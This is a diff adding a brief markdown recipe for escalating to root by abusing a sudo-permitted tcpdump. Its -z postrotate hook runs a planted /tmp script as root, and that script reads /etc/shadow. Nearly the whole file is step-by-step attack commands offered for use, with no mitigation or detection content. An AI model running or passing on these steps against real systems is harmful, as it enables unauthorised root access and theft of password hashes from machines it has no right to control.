@@ -1,0 +1,11 @@
+# Escalation privileges via tcp dump v4.0.0 and above
+
+1. We type sudo -l as our user and see /usr/sbin/tcpdump
+
+2. echo $'id\ncat /etc/shadow' > /tmp/.test
+
+3. chmod +x /tmp/.test
+
+4. sudo tcpdump -ln -i eth0  -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+5. And we will see it enter sniffing mode and BOOM we will get our data.
